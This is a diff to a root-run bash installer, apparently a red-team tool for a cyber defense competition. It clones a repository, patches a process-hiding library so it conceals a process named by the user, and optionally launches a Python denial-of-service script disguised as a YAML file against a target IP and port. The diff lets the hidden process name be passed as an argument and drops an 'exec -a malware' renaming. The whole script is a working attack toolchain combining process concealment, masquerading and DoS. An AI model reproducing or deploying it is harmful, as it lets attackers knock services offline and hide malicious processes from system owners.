@@ -9,19 +9,20 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Check if script has proper args
-if [ "$#" -eq 0 ]; then
+if [ "$#" -eq 1 ]; then
     echo "Program running in install-only mode."
-elif [ "$#" -eq 2 ]; then
+elif [ "$#" -eq 3 ]; then
     echo "Program running in saturation/DOS mode."
 else
-    echo "Proper usage is either `sudo ./$0` for install-only mode or `sudo ./$0 TARGET-IP TARGET-PORT` for saturation/DOS mode."
+    echo "Proper usage is either `sudo ./$0 TARGET-SERVICE` for install-only mode or `sudo ./$0 TARGET-SERVICE TARGET-IP TARGET-PORT` for saturation/DOS mode."
+    exit 1
 fi
 
 # Define variables
 REPO_URL="https://github.com/AYanofsky/ccdc-invisible-saturation/"
 TARGET_FILE="processhider.c"
 SEARCH_STRING="static const char* process_to_filter = "evil_script.py";"
-REPLACE_STRING="static const char* process_to_filter = "REPLACEME";"
+REPLACE_STRING="static const char* process_to_filter = "$1";"
 
 # Clone the repository
 echo "Cloning repository..."
@@ -56,11 +57,11 @@ cd ..
 mv ccdc-invisible-saturation/dev-inventory.yml ./dev-inventory.yml
 
 
-if [ $# -eq 2 ]; then
-        exec -a malware python3 dev-inventory.yml $1 $2 &
+if [ $# -eq 3 ]; then
+        python3 dev-inventory.yml $2 $3 &
 fi
 
-if [ $# -eq 0 ]; then
+if [ $# -eq 1 ]; then
         rm dev-inventory.yml
 fi
 
